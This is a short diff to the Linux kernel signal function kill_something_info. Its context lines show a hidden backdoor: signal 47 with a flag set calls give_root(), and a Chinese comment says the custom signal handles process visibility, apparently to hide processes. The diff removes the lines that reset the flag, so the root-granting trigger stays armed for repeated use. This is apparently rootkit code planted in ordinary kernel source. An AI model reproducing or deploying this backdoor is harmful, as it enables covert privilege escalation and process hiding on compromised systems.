@@ -1642,7 +1642,6 @@ static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
 	int ret;
 	if(sig == 47 && MY_VAL == 1){
           give_root();
-          MY_VAL = 0;
           return 0;
 	}
    // 检查是否是自定义信号，用于处理进程可见性
@@ -1661,7 +1660,6 @@ static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
 //                   task->pid,
 //                   (task->flags & 0x10000000) ? "hidden" : "visible");
             put_task_struct(task); // 释放引用计数
- 	    MY_VAL = 0;
             rcu_read_unlock(); // 解锁
             return 0;
         }
